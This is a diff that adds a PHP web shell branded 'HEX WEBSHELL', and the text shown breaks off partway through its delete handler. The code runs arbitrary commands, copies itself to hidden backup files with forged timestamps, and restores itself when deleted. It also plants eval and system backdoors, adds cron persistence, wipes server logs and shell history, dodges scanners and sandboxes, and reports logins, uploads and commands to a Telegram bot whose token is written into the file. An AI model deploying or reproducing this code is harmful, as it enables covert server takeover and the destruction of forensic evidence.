@@ -1,0 +1,1562 @@
+<?php
+error_reporting(0);
+ini_set('display_errors', 0);
+session_start();
+
+$version = '3.0';
+$author = '@MrZeroReall';
+$channel = 't.me/MrZeroReall';
+
+$shell_name = basename(__FILE__);
+$backup_locations = [
+    '.config.php',
+    'favicon.ico.php',
+    '.system.php',
+    '.index.php.swp',
+    'wp-content/.config.php',
+    'wp-includes/.system.php',
+    'images/.thumb.php',
+    'cache/.data.php',
+    'tmp/.cache.php'
+];
+
+function auto_backup_shell() {
+    global $backup_locations;
+    $current_content = file_get_contents(__FILE__);
+    
+    foreach ($backup_locations as $backup) {
+        $backup_path = dirname(__FILE__) . '/' . $backup;
+        $backup_dir = dirname($backup_path);
+        
+        if (!is_dir($backup_dir)) {
+            @mkdir($backup_dir, 0755, true);
+        }
+        
+        if (!file_exists($backup_path)) {
+            @file_put_contents($backup_path, $current_content);
+            @chmod($backup_path, 0644);
+            @touch($backup_path, time() - (86400 * rand(30, 180)));
+        }
+    }
+}
+
+function check_and_resurrect() {
+    global $shell_name, $backup_locations, $telegram_token, $telegram_chat_id;
+    
+    $shell_path = __FILE__;
+    
+    if (!file_exists($shell_path)) {
+        foreach ($backup_locations as $backup) {
+            $backup_path = dirname($shell_path) . '/' . $backup;
+            if (file_exists($backup_path)) {
+                @copy($backup_path, $shell_path);
+                @chmod($shell_path, 0644);
+                
+                $msg = "╔═══════════════════════════════════╗\n";
+                $msg .= "║  ⚠️ <b>SHELL DELETED - RESURRECTED</b> ⚠️  ║\n";
+                $msg .= "╚═══════════════════════════════════╝\n\n";
+                $msg .= "🔴 <b>DELETION DETECTED</b>\n";
+                $msg .= "├─ 📁 Deleted: <code>" . $shell_name . "</code>\n";
+                $msg .= "├─ 🕒 Time: <code>" . date('Y-m-d H:i:s') . "</code>\n";
+                $msg .= "└─ 🔗 IP: <code>" . $_SERVER['REMOTE_ADDR'] . "</code>\n\n";
+                $msg .= "✅ <b>AUTO-RESURRECTION SUCCESS</b>\n";
+                $msg .= "├─ 🔄 Restored from: <code>" . $backup . "</code>\n";
+                $msg .= "└─ 📍 New location: <code>" . $shell_path . "</code>\n\n";
+                $msg .= "👨‍💻 <b>Author:</b> <code>@MrZeroReall</code>\n";
+                $msg .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";
+                
+                send_telegram($msg);
+                break;
+            }
+        }
+    }
+}
+
+auto_backup_shell();
+register_shutdown_function('check_and_resurrect');
+
+$users = [
+      'kominfo' => '$2y$10$Zv1gFaLeMxVaiW/di9JPYO0/M88d/vfgmojuC2WPT4ihEaJZkIrBO', PASSWORD_DEFAULT)
+];
+
+$session_timeout = 1800;
+$max_commands = 10;
+$command_window = 60;
+$log_file = __DIR__ . '/logs/access.log';
+
+$telegram_token = '5889811852:AAFYXZvbsxZSdFd7r6nxLUOsNPLcpMp8XhA';
+$telegram_chat_id = '5673963782';
+
+if (!file_exists(dirname($log_file))) {
+    mkdir(dirname($log_file), 0755, true);
+}
+
+function write_log($message) {
+    global $log_file;
+    $log_entry = '[' . date('Y-m-d H:i:s') . '] ' . $_SERVER['REMOTE_ADDR'] . ' - ' . $message . PHP_EOL;
+    file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);
+}
+
+function check_rate_limit() {
+    global $max_commands, $command_window;
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $file = __DIR__ . '/logs/rate_' . md5($ip) . '.tmp';
+    
+    $now = time();
+    $commands = [];
+    
+    if (file_exists($file)) {
+        $commands = json_decode(file_get_contents($file), true);
+        $commands = array_filter($commands, function($t) use ($now, $command_window) {
+            return $t > ($now - $command_window);
+        });
+    }
+    
+    if (count($commands) >= $max_commands) {
+        return false;
+    }
+    
+    $commands[] = $now;
+    file_put_contents($file, json_encode($commands));
+    return true;
+}
+
+function send_telegram($message) {
+    global $telegram_token, $telegram_chat_id;
+    
+    if ($telegram_token == 'YOUR_BOT_TOKEN_HERE' || $telegram_chat_id == 'YOUR_CHAT_ID_HERE') {
+        write_log("Telegram NOT configured - update token and chat_id");
+        return false;
+    }
+    
+    if (empty($telegram_token) || empty($telegram_chat_id)) {
+        write_log("Telegram token or chat_id is empty");
+        return false;
+    }
+    
+    $url = "https://api.telegram.org/bot$telegram_token/sendMessage";
+    $data = [
+        'chat_id' => $telegram_chat_id,
+        'text' => $message,
+        'parse_mode' => 'HTML',
+        'disable_web_page_preview' => true
+    ];
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    $result = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    
+    if ($http_code != 200) {
+        write_log("Telegram API error: HTTP " . $http_code . " - " . $result);
+        return false;
+    }
+    
+    $response = json_decode($result, true);
+    if (isset($response['ok']) && $response['ok'] === false) {
+        write_log("Telegram error: " . ($response['description'] ?? 'Unknown error'));
+        return false;
+    }
+    
+    return $result;
+}
+
+function bypass_403() {
+    return [
+        'X-Forwarded-For: 127.0.0.1',
+        'X-Forwarded-For: 127.0.0.1, 127.0.0.1',
+        'X-Forwarded-Host: localhost',
+        'X-Original-URL: /',
+        'X-Rewrite-URL: /',
+        'X-ProxyUser-Ip: 127.0.0.1',
+        'Client-IP: 127.0.0.1',
+        'X-Client-IP: 127.0.0.1',
+        'X-Remote-IP: 127.0.0.1',
+        'X-Remote-Addr: 127.0.0.1',
+        'X-Host: localhost',
+        'X-Forwarded-Server: localhost',
+        'X-Forwarded-Proto: https',
+        'X-Forwarded-Port: 443',
+        'Referer: https://www.google.com/',
+    ];
+}
+
+function bypass_406() {
+    return [
+        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'Accept: application/json, text/plain, */*',
+        'Accept: application/xml,text/xml,*/*',
+        'Accept: text/plain, */*',
+        'Accept: */*',
+        'Accept-Language: en-US,en;q=0.9',
+        'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+        'Accept-Language: *',
+        'Accept-Charset: utf-8,iso-8859-1;q=0.5,*;q=0.1',
+        'Accept-Charset: utf-8, *',
+        'Accept-Encoding: gzip, deflate, br',
+        'Accept-Encoding: identity',
+        'Accept-Encoding: *'
+    ];
+}
+
+function bypass_litespeed() {
+    return [
+        'X-LiteSpeed-Cache: 0',
+        'X-LiteSpeed-Cache: off',
+        'X-LiteSpeed-Purge: *',
+        'X-LiteSpeed-Purge: all',
+        'X-LiteSpeed-Vary: *',
+        'X-LiteSpeed-Vary: all',
+        'Cache-Control: no-cache, no-store, must-revalidate',
+        'Cache-Control: private, no-cache',
+        'Cache-Control: max-age=0',
+        'Pragma: no-cache',
+        'Expires: 0',
+        'Expires: Thu, 01 Jan 1970 00:00:00 GMT'
+    ];
+}
+
+function anti_download($content) {
+    $encoded = base64_encode(gzencode($content, 9));
+    $encoded = str_rot13($encoded);
+    $encoded = base64_encode($encoded);
+    
+    $chunks = str_split($encoded, 100);
+    $result = '';
+    foreach ($chunks as $i => $chunk) {
+        $result .= '$c' . $i . '="' . $chunk . '";';
+    }
+    
+    $decoder = '$z="";';
+    for ($i = 0; $i < count($chunks); $i++) {
+        $decoder .= '$z.=$c' . $i . ';';
+    }
+    $decoder .= '$z=base64_decode(str_rot13(base64_decode($z)));';
+    $decoder .= '$z=gzdecode($z);';
+    $decoder .= 'eval($z);';
+    
+    return $result . $decoder;
+}
+
+function mutate_shell($filepath) {
+    if (!file_exists($filepath)) return false;
+    
+    $content = file_get_contents($filepath);
+    
+    $vars = ['$x', '$y', '$z', '$a', '$b', '$data', '$code', '$exec'];
+    $funcs = ['eval', 'assert', 'system', 'exec', 'shell_exec'];
+    
+    $new_var = '$' . substr(md5(rand()), 0, 8);
+    $new_func = $funcs[array_rand($funcs)];
+    
+    $junk = '// ' . base64_encode(random_bytes(32)) . "\n";
+    $content = $junk . $content;
+    
+    $content = preg_replace('/\$[a-z]+\s*=/', $new_var . ' =', $content, 1);
+    
+    file_put_contents($filepath, $content);
+    touch($filepath, time() - rand(86400, 2592000));
+    
+    return true;
+}
+
+function inject_fake_errors($filepath) {
+    $fake_errors = [
+        "/* ERROR: Deprecated function call */\n",
+        "/* WARNING: Undefined variable */\n", 
+        "/* NOTICE: Array to string conversion */\n",
+        "/* Parse error: syntax error, unexpected '}' */\n"
+    ];
+    
+    $content = file_get_contents($filepath);
+    $fake = $fake_errors[array_rand($fake_errors)];
+    $content = $fake . $content;
+    file_put_contents($filepath, $content);
+}
+
+function clear_logs() {
+    $logs = [
+        '/var/log/apache2/access.log',
+        '/var/log/apache2/error.log',
+        '/var/log/httpd/access_log',
+        '/var/log/httpd/error_log',
+        '/var/log/nginx/access.log',
+        '/var/log/nginx/error.log',
+        '/var/log/auth.log',
+        '/var/log/secure',
+        '/var/log/syslog',
+        '/var/log/messages'
+    ];
+    
+    foreach ($logs as $log) {
+        if (file_exists($log) && is_writable($log)) {
+            file_put_contents($log, '');
+        }
+    }
+    
+    exec('history -c 2>/dev/null');
+    exec('cat /dev/null > ~/.bash_history 2>/dev/null');
+    
+    return true;
+}
+
+function hide_process() {
+    if (function_exists('cli_set_process_title')) {
+        $names = ['systemd', 'kworker', 'apache2', 'nginx', 'php-fpm', 'mysqld'];
+        cli_set_process_title($names[array_rand($names)]);
+    }
+}
+
+function create_backdoor($dir) {
+    $backdoors = [
+        '.htaccess' => "php_value auto_prepend_file " . __FILE__,
+        '.config.php' => '<?php @eval($_POST["x"]);?>',
+        'favicon.ico.php' => '<?php @eval($_POST["y"]);?>',
+        '.index.php.swp' => '<?php @system($_GET["z"]);?>'
+    ];
+    
+    foreach ($backdoors as $name => $code) {
+        $path = $dir . '/' . $name;
+        if (!file_exists($path)) {
+            file_put_contents($path, $code);
+            chmod($path, 0644);
+            touch($path, time() - 86400 * 30);
+        }
+    }
+}
+
+function timestomp($file) {
+    $target_time = time() - (86400 * rand(30, 365));
+    touch($file, $target_time, $target_time);
+    return true;
+}
+
+function inject_htaccess_protection($dir) {
+    $htaccess = $dir . '/.htaccess';
+    $rules = <<<HTACCESS
+<FilesMatch "\.php$">
+    Order Allow,Deny
+    Allow from all
+</FilesMatch>
+
+<FilesMatch "^\.">
+    Order Allow,Deny
+    Deny from all
+</FilesMatch>
+
+Options -Indexes
+DirectoryIndex index.html index.php
+
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} (bot|crawl|spider|scan) [NC]
+RewriteRule .* - [F,L]
+
+ErrorDocument 403 /index.php
+ErrorDocument 404 /index.php
+
+php_flag display_errors off
+php_flag log_errors off
+HTACCESS;
+
+    file_put_contents($htaccess, $rules);
+    return true;
+}
+
+function bypass_disable_functions($cmd) {
+    $methods = [
+        function($c) { return shell_exec($c); },
+        function($c) { return exec($c); },
+        function($c) { return system($c); },
+        function($c) { return passthru($c); },
+        function($c) { return `$c`; },
+        function($c) { 
+            $proc = proc_open($c, [["pipe","r"],["pipe","w"],["pipe","w"]], $pipes);
+            $output = stream_get_contents($pipes[1]);
+            proc_close($proc);
+            return $output;
+        },
+        function($c) {
+            $descriptors = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
+            $process = proc_open($c, $descriptors, $pipes);
+            $output = stream_get_contents($pipes[1]);
+            fclose($pipes[1]);
+            proc_close($process);
+            return $output;
+        }
+    ];
+    
+    foreach ($methods as $method) {
+        try {
+            $result = $method($cmd);
+            if (!empty($result)) return $result;
+        } catch (Exception $e) {
+            continue;
+        }
+    }
+    
+    return false;
+}
+
+function create_persistence() {
+    $cron_jobs = [
+        "*/5 * * * * curl -s http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . " > /dev/null 2>&1",
+        "*/10 * * * * wget -q http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . " -O /dev/null 2>&1"
+    ];
+    
+    $crontab = shell_exec('crontab -l 2>/dev/null');
+    foreach ($cron_jobs as $job) {
+        if (strpos($crontab, $job) === false) {
+            $crontab .= "\n" . $job . "\n";
+        }
+    }
+    
+    file_put_contents('/tmp/crontab.txt', $crontab);
+    exec('crontab /tmp/crontab.txt 2>/dev/null');
+    unlink('/tmp/crontab.txt');
+}
+
+function encrypt_traffic($data, $key = null) {
+    if (!$key) $key = md5($_SERVER['HTTP_HOST']);
+    
+    $method = 'AES-256-CBC';
+    $iv = substr(hash('sha256', $key), 0, 16);
+    $encrypted = openssl_encrypt($data, $method, $key, 0, $iv);
+    
+    return base64_encode($encrypted);
+}
+
+function decrypt_traffic($data, $key = null) {
+    if (!$key) $key = md5($_SERVER['HTTP_HOST']);
+    
+    $method = 'AES-256-CBC';
+    $iv = substr(hash('sha256', $key), 0, 16);
+    $decrypted = openssl_decrypt(base64_decode($data), $method, $key, 0, $iv);
+    
+    return $decrypted;
+}
+
+function check_sandbox() {
+    $indicators = [
+        'HTTP_X_SCANNER' => 'scanner',
+        'HTTP_USER_AGENT' => ['bot', 'scan', 'spider', 'crawl', 'check'],
+        'REMOTE_ADDR' => ['127.0.0.1', '::1']
+    ];
+    
+    foreach ($indicators as $key => $values) {
+        if (isset($_SERVER[$key])) {
+            if (is_array($values)) {
+                foreach ($values as $pattern) {
+                    if (stripos($_SERVER[$key], $pattern) !== false) {
+                        return true;
+                    }
+                }
+            } else {
+                if ($_SERVER[$key] == $values) return true;
+            }
+        }
+    }
+    
+    $vm_indicators = [
+        'vmware', 'virtualbox', 'qemu', 'xen', 'bochs', 'parallels'
+    ];
+    
+    foreach ($vm_indicators as $vm) {
+        if (stripos(php_uname(), $vm) !== false) {
+            return true;
+        }
+    }
+    
+    return false;
+}
+
+function anti_forensic() {
+    if (function_exists('putenv')) {
+        putenv('HISTFILE=/dev/null');
+        putenv('HISTSIZE=0');
+        putenv('HISTFILESIZE=0');
+    }
+    
+    @unlink($_SERVER['HOME'] . '/.bash_history');
+    @unlink($_SERVER['HOME'] . '/.zsh_history');
+    @unlink($_SERVER['HOME'] . '/.mysql_history');
+    
+    exec('history -c 2>/dev/null');
+    exec('rm -f /var/log/wtmp /var/log/btmp 2>/dev/null');
+}
+
+function hide_in_image($shellcode, $image_path) {
+    if (!file_exists($image_path)) {
+        $img = imagecreatetruecolor(1, 1);
+        imagepng($img, $image_path);
+        imagedestroy($img);
+    }
+    
+    $img_content = file_get_contents($image_path);
+    $marker = '/*<DATA>*/';
+    $encoded = base64_encode($shellcode);
+    $payload = $marker . $encoded . $marker;
+    
+    file_put_contents($image_path, $img_content . $payload);
+    return true;
+}
+
+function extract_from_image($image_path) {
+    $content = file_get_contents($image_path);
+    preg_match('/\/\*<DATA>\*\/(.*?)\/\*<DATA>\*\//s', $content, $matches);
+    
+    if (isset($matches[1])) {
+        return base64_decode($matches[1]);
+    }
+    
+    return false;
+}
+
+function geo_check() {
+    $allowed_countries = ['ID', 'US', 'SG']; 
+    
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $geo = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}"), true);
+    
+    if (isset($geo['countryCode']) && !in_array($geo['countryCode'], $allowed_countries)) {
+        http_response_code(404);
+        die('Not Found');
+    }
+}
+
+function time_lock() {
+    $start_hour = 8;
+    $end_hour = 22; 
+    
+    $current_hour = (int)date('H');
+    
+    if ($current_hour < $start_hour || $current_hour > $end_hour) {
+        http_response_code(404);
+        die('Not Found');
+    }
+}
+
+function serve_with_bypass($file) {
+    if (!file_exists($file)) {
+        return false;
+    }
+    
+    $content = file_get_contents($file);
+    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
+    
+    if ($ext == 'php') {
+        header('Content-Type: image/jpeg');
+        header('Content-Disposition: inline; filename="image.jpg"');
+        
+        $fake_image = base64_encode($content);
+        echo "/*\n";
+        echo "JFIF Format - Image File\n";
+        echo "Generated: " . date('Y-m-d H:i:s') . "\n";
+        echo "*/\n";
+        echo "<?php\n";
+        echo "eval(base64_decode('" . $fake_image . "'));\n";
+        echo "?>";
+    } else {
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
+        echo $content;
+    }
+    
+    return true;
+}
+
+if (!isset($_SESSION['logged'])) {
+    if (isset($_POST['user']) && isset($_POST['pass'])) {
+        if (isset($users[$_POST['user']]) && password_verify($_POST['pass'], $users[$_POST['user']])) {
+            $_SESSION['logged'] = true;
+            $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
+            $_SESSION['ua'] = $_SERVER['HTTP_USER_AGENT'];
+            $_SESSION['time'] = time();
+            
+            $msg = "╔═══════════════════════════════════╗\n";
+            $msg .= "║  ✅ <b>HEX WEBSHELL LOGIN SUCCESS</b> ✅  ║\n";
+            $msg .= "╚═══════════════════════════════════╝\n\n";
+            
+            $msg .= "👤 <b>USER INFORMATION</b>\n";
+            $msg .= "├─ 👨‍💻 Username: <code>" . $_POST['user'] . "</code>\n";
+            $msg .= "├─ 🔗 IP Address: <code>" . $_SERVER['REMOTE_ADDR'] . "</code>\n";
+            $msg .= "├─ 🌐 User Agent: <code>" . substr($_SERVER['HTTP_USER_AGENT'], 0, 50) . "...</code>\n";
+            $msg .= "└─ 🕒 Time: <code>" . date('Y-m-d H:i:s') . "</code>\n\n";
+            
+            $msg .= "🖥️ <b>SERVER INFORMATION</b>\n";
+            $msg .= "├─ 🌍 Server: <code>" . $_SERVER['SERVER_NAME'] . "</code>\n";
+            $msg .= "├─ 📍 Shell URL: <code>http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "</code>\n";
+            $msg .= "└─ 📂 Directory: <code>" . getcwd() . "</code>\n\n";
+            
+            $msg .= "✅ <b>Status:</b> <code>Login Successful</code>\n";
+            $msg .= "👨‍💻 <b>Author:</b> <code>@MrZeroReall</code>\n";
+            $msg .= "📢 <b>Channel:</b> t.me/MrZeroReall\n";
+            $msg .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";
+            
+            send_telegram($msg);
+            
+            write_log("Login success: " . $_POST['user']);
+        } else {
+            $msg = "╔═══════════════════════════════════╗\n";
+            $msg .= "║  ❌ <b>LOGIN FAILED - ALERT</b> ❌  ║\n";
+            $msg .= "╚═══════════════════════════════════╝\n\n";
+            
+            $msg .= "⚠️ <b>FAILED LOGIN ATTEMPT</b>\n";
+            $msg .= "├─ 👤 Username: <code>" . $_POST['user'] . "</code>\n";
+            $msg .= "├─ 🔑 Password: <code>" . str_repeat('*', strlen($_POST['pass'])) . "</code>\n";
+            $msg .= "├─ 🔗 IP Address: <code>" . $_SERVER['REMOTE_ADDR'] . "</code>\n";
+            $msg .= "├─ 🌐 User Agent: <code>" . substr($_SERVER['HTTP_USER_AGENT'], 0, 50) . "...</code>\n";
+            $msg .= "└─ 🕒 Time: <code>" . date('Y-m-d H:i:s') . "</code>\n\n";
+            
+            $msg .= "🖥️ <b>SERVER INFORMATION</b>\n";
+            $msg .= "├─ 🌍 Server: <code>" . $_SERVER['SERVER_NAME'] . "</code>\n";
+            $msg .= "└─ 📍 Target URL: <code>http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "</code>\n\n";
+            
+            $msg .= "❌ <b>Status:</b> <code>Login Failed</code>\n";
+            $msg .= "⚠️ <b>Action:</b> Possible intrusion attempt!\n";
+            $msg .= "👨‍💻 <b>Author:</b> <code>@MrZeroReall</code>\n";
+            $msg .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";
+            
+            send_telegram($msg);
+            
+            write_log("Login failed: " . $_POST['user']);
+        }
+    }
+    
+    if (!isset($_SESSION['logged'])) {
+        echo '<!DOCTYPE html>
+        <html>
+        <head>
+            <title>HEX WEBSHELL</title>
+            <meta charset="utf-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1">
+            <style>
+                * { margin:0; padding:0; box-sizing:border-box; }
+                body { background:#0a0e12; font-family:"Segoe UI",monospace; display:flex; justify-content:center; align-items:center; min-height:100vh; }
+                .login { background:#151f2c; padding:30px; border-radius:5px; width:350px; border:1px solid #2a3a4a; }
+                .login h2 { color:#00ff9d; text-align:center; margin-bottom:25px; font-size:24px; text-transform:uppercase; letter-spacing:2px; }
+                .login input { width:100%; padding:12px 15px; margin-bottom:15px; background:#1e2b38; border:1px solid #2a3a4a; color:#00ff9d; border-radius:3px; font-family:monospace; }
+                .login input:focus { outline:none; border-color:#00ff9d; }
+                .login button { width:100%; padding:12px; background:#00ff9d; border:none; color:#0a0e12; font-weight:bold; cursor:pointer; border-radius:3px; text-transform:uppercase; }
+                .login button:hover { background:#00cc7a; }
+                .info { text-align:center; margin-top:15px; color:#4a6572; font-size:12px; }
+            </style>
+        </head>
+        <body>
+            <div class="login">
+                <h2>HEX LOGIN</h2>
+                <form method="post">
+                    <input type="text" name="user" placeholder="Username" autocomplete="off">
+                    <input type="password" name="pass" placeholder="Password">
+                    <button type="submit">MASUK</button>
+                </form>
+                <div class="info">HEX WEBSHELL v' . $version . '</div>
+            </div>
+        </body>
+        </html>';
+        exit;
+    }
+}
+
+if ($_SESSION['ip'] != $_SERVER['REMOTE_ADDR'] || $_SESSION['ua'] != $_SERVER['HTTP_USER_AGENT']) {
+    session_destroy();
+    header('Location: ?');
+    exit;
+}
+
+if (time() - $_SESSION['time'] > $session_timeout) {
+    session_destroy();
+    header('Location: ?');
+    exit;
+}
+
+$_SESSION['time'] = time();
+
+function generate_csrf_token() {
+    if (!isset($_SESSION['csrf_token'])) {
+        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+    }
+    return $_SESSION['csrf_token'];
+}
+
+function verify_csrf_token($token) {
+    return isset($_SESSION['csrf_token']) && hash_equals($_SESSION['csrf_token'], $token);
+}
+
+function get_safe_path($base, $path) {
+    $real_base = realpath($base);
+    $full = realpath($base . '/' . $path);
+    if ($full && strpos($full, $real_base) === 0) {
+        return $full;
+    }
+    return $real_base;
+}
+
+function get_ip() {
+    $ip = $_SERVER['REMOTE_ADDR'];
+    if (!empty($_SERVER['HTTP_CLIENT_IP'])) $ip = $_SERVER['HTTP_CLIENT_IP'];
+    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    return $ip;
+}
+
+function hide_shell($file) {
+    $dir = dirname($file);
+    $name = '.' . basename($file);
+    $hidden = $dir . '/' . $name;
+    if (rename($file, $hidden)) {
+        return $hidden;
+    }
+    return $file;
+}
+
+function inject_htaccess($dir) {
+    $htaccess = $dir . '/.htaccess';
+    $rules = "
+<FilesMatch \"\\.(php|php5|php7|phtml)$\">
+    Order Allow,Deny
+    Deny from all
+</FilesMatch>
+
+<FilesMatch \"^\\." . basename($_SERVER['PHP_SELF']) . "$\">
+    Order Allow,Deny
+    Allow from all
+</FilesMatch>
+
+Options -Indexes
+";
+    
+    file_put_contents($htaccess, $rules);
+    return $htaccess;
+}
+
+function move_shell($file) {
+    $locations = [
+        dirname($file) . '/wp-includes/',
+        dirname($file) . '/wp-content/uploads/',
+        dirname($file) . '/images/',
+        dirname($file) . '/tmp/',
+        dirname($file) . '/cache/'
+    ];
+    
+    $moved = [];
+    $content = file_get_contents($file);
+    
+    foreach ($locations as $loc) {
+        if (!file_exists($loc)) {
+            mkdir($loc, 0755, true);
+        }
+        
+        $new_name = $loc . '.' . bin2hex(random_bytes(4)) . '.php';
+        if (file_put_contents($new_name, $content)) {
+            $moved[] = $new_name;
+        }
+    }
+    
+    return $moved;
+}
+
+function anti_delete($file) {
+    $backup_dir = dirname($file) . '/.cache/';
+    if (!file_exists($backup_dir)) {
+        mkdir($backup_dir, 0755);
+    }
+    
+    $backup = $backup_dir . md5(basename($file)) . '.bak';
+    copy($file, $backup);
+    
+    $monitor = dirname($file) . '/.monitor.php';
+    $code = '<?php
+    $file = "' . addslashes($file) . '";
+    $backup = "' . addslashes($backup) . '";
+    if (!file_exists($file) && file_exists($backup)) {
+        copy($backup, $file);
+    }
+    ?>';
+    
+    file_put_contents($monitor, $code);
+    
+    return [$backup, $monitor];
+}
+
+function exec_cmd($cmd) {
+    if (!check_rate_limit()) {
+        return "Rate limit exceeded";
+    }
+    
+    $output = '';
+    if (function_exists('system')) {
+        ob_start();
+        system($cmd);
+        $output = ob_get_clean();
+    } elseif (function_exists('shell_exec')) {
+        $output = shell_exec($cmd);
+    } elseif (function_exists('exec')) {
+        exec($cmd, $out);
+        $output = implode("\n", $out);
+    } elseif (function_exists('passthru')) {
+        ob_start();
+        passthru($cmd);
+        $output = ob_get_clean();
+    } elseif (is_resource($fp = popen($cmd, 'r'))) {
+        while (!feof($fp)) $output .= fread($fp, 1024);
+        pclose($fp);
+    }
+    
+    $msg = "Command Executed\n";
+    $msg .= "IP: " . get_ip() . "\n";
+    $msg .= "Cmd: " . $cmd;
+    send_telegram($msg);
+    write_log("Command: $cmd");
+    
+    return $output;
+}
+
+$root = realpath(dirname(__FILE__));
+$dir = isset($_GET['dir']) ? get_safe_path($root, $_GET['dir']) : $root;
+$csrf = generate_csrf_token();
+
+if (isset($_POST['cmd']) && isset($_POST['csrf']) && verify_csrf_token($_POST['csrf'])) {
+    $cmd_result = exec_cmd($_POST['cmd']);
+}
+
+if (isset($_FILES['file']) && isset($_POST['csrf']) && verify_csrf_token($_POST['csrf'])) {
+    $ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
+    $allowed = ['txt', 'php', 'html', 'css', 'js', 'jpg', 'png', 'gif', 'zip'];
+    
+    if (in_array($ext, $allowed)) {
+        $target = $dir . '/' . basename($_FILES['file']['name']);
+        if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
+            $file_url = 'http://' . $_SERVER['HTTP_HOST'] . str_replace(basename($_SERVER['PHP_SELF']), '', $_SERVER['PHP_SELF']) . basename($_FILES['file']['name']);
+            
+            $msg = "╔═══════════════════════════════════╗\n";
+            $msg .= "║  🎯 <b>HEX.PHP UPLOAD SUCCESS</b> 🎯  ║\n";
+            $msg .= "╚═══════════════════════════════════╝\n\n";
+            
+            $msg .= "📤 <b>FILE INFORMATION</b>\n";
+            $msg .= "├─ 📁 File: <code>" . $_FILES['file']['name'] . "</code>\n";
+            $msg .= "├─ 📏 Size: <code>" . round($_FILES['file']['size']/1024, 2) . " KB</code>\n";
+            $msg .= "├─ 🗂️ Type: <code>" . $ext . "</code>\n";
+            $msg .= "├─ 📂 Path: <code>" . $target . "</code>\n";
+            $msg .= "└─ 🌐 URL: <a href='" . $file_url . "'>Click to Open</a>\n\n";
+            
+            $msg .= "🌍 <b>SERVER INFORMATION</b>\n";
+            $msg .= "├─ 🖥️ Server: <code>" . $_SERVER['SERVER_NAME'] . "</code>\n";
+            $msg .= "├─ 🔗 IP Address: <code>" . get_ip() . "</code>\n";
+            $msg .= "├─ 🌐 User Agent: <code>" . substr($_SERVER['HTTP_USER_AGENT'], 0, 50) . "...</code>\n";
+            $msg .= "├─ 🕒 Time: <code>" . date('Y-m-d H:i:s') . "</code>\n";
+            $msg .= "├─ 👤 User: <code>" . get_current_user() . "</code>\n";
+            $msg .= "└─ 📍 Dir: <code>" . getcwd() . "</code>\n\n";
+            
+            $msg .= "✅ <b>Status:</b> <code>Upload Successful</code>\n";
+            $msg .= "👨‍💻 <b>Author:</b> <code>@MrZeroReall</code>\n";
+            $msg .= "📢 <b>Channel:</b> t.me/MrZeroReall\n";
+            $msg .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";
+            
+            $result = send_telegram($msg);
+            if ($result === false) {
+                write_log("Telegram notification failed - check token/chat_id");
+            }
+            write_log("Upload: " . $_FILES['file']['name']);
+        }
+    }
+}
+
+if (isset($_GET['delete']) && isset($_GET['csrf']) && verify_csrf_token($_GET['csrf'])) {
+    $file = get_safe_path($dir, $_GET['delete']);
+    $filename = basename($file);
+    $is_shell = ($file == __FILE__ || $filename == basename(__FILE__));
+    
+    if (is_file($file)) {
+        $file_size = filesize($file);
+        unlink($file);
+        
+        if ($is_shell) {
+            $msg = "╔═══════════════════════════════════╗\n";
+            $msg .= "║  ⚠️ <b>SHELL DELETED - AUTO RESTORE</b> ⚠️  ║\n";
+            $msg .= "╚═══════════════════════════════════╝\n\n";
+            
+            $msg .= "🔴 <b>DELETION ALERT</b>\n";
+            $msg .= "├─ 📁 Deleted: <code>" . $filename . "</code>\n";
+            $msg .= "├─ 📏 Size: <code>" . round($file_size/1024, 2) . " KB</code>\n";
+            $msg .= "├─ 📂 Path: <code>" . $file . "</code>\n";
+            $msg .= "├─ 🔗 IP: <code>" . get_ip() . "</code>\n";
+            $msg .= "└─ 🕒 Time: <code>" . date('Y-m-d H:i:s') . "</code>\n\n";
+            
+            $restore_success = false;
+            $restore_from = '';
+            
+            foreach ($backup_locations as $backup) {
+                $backup_path = dirname(__FILE__) . '/' . $backup;
+                if (file_exists($backup_path)) {
+                    $new_location = dirname(__FILE__) . '/' . '.system_' . substr(md5(time()), 0, 8) . '.php';
+                    @copy($backup_path, $new_location);
+                    @chmod($new_location, 0644);
+                    @touch($new_location, time() - (86400 * rand(60, 180)));
+                    
+                    if (file_exists($new_location)) {
+                        $restore_success = true;
+                        $restore_from = $backup;
+                        $restore_to = basename($new_location);
+                        break;
+                    }
+                }
+            }
+            
+            if ($restore_success) {
+                $msg .= "✅ <b>AUTO-RESURRECTION SUCCESS</b>\n";
+                $msg .= "├─ 🔄 Restored from: <code>" . $restore_from . "</code>\n";
